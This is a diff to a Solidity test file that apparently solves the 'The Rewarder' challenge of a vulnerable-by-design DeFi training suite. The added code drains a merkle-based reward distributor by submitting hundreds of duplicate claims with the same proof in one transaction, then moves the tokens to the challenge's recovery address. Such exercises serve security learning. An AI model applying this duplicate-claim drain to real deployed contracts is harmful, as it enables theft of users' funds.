@@ -19,8 +19,8 @@ contract TheRewarderChallenge is Test {
     uint256 constant TOTAL_WETH_DISTRIBUTION_AMOUNT = 1 ether;
 
     // Alice is the address at index 2 in the distribution files
-    uint256 constant ALICE_DVT_CLAIM_AMOUNT = 2502024387994809;
-    uint256 constant ALICE_WETH_CLAIM_AMOUNT = 228382988128225;
+    uint256 constant ALICE_DVT_CLAIM_AMOUNT = 2502024387994809; // 0.0025 DVT
+    uint256 constant ALICE_WETH_CLAIM_AMOUNT = 228382988128225; // 0.00023 WETH
 
     TheRewarderDistributor distributor;
 
@@ -54,6 +54,7 @@ contract TheRewarderChallenge is Test {
         weth.deposit{value: TOTAL_WETH_DISTRIBUTION_AMOUNT}();
 
         // Calculate roots for DVT and WETH distributions
+        // 누가 얼마를 받을 수 있는지를 merkle tree로 압축해서 root만 컨트랙트에 저장
         bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
         bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
         merkle = new Merkle();
@@ -148,7 +149,51 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        console.log("player address", player);
+        // 0x44E97aF4418b7a17AABD8090bEA0A471a366305C
+
+        uint256 PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
+        uint256 PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;
+
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        // Set DVT and WETH as tokens to claim
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        // DVT drain count > (10 ether - alice's dvt claim amount - 1e16) / player's dvt claim amount => 867
+        // WETH drain count > (1 ether - alice's weth claim amount - 1e15) / player's weth claim amount => 853
+        Claim[] memory claims = new Claim[](1720);
+
+        // DVT drain
+        for (uint256 i = 0; i < 867; i++) {
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: PLAYER_DVT_CLAIM_AMOUNT,
+                tokenIndex: 0,
+                proof: merkle.getProof(dvtLeaves, 188)
+            });
+        }
+
+        // WETH drain
+        for (uint256 i = 867; i < 1720; i++) {
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: PLAYER_WETH_CLAIM_AMOUNT,
+                tokenIndex: 1,
+                proof: merkle.getProof(wethLeaves, 188)
+            });
+        }
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+        console.log("dvt balance of player", dvt.balanceOf(player));
+        console.log("weth balance of player", weth.balanceOf(player));
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
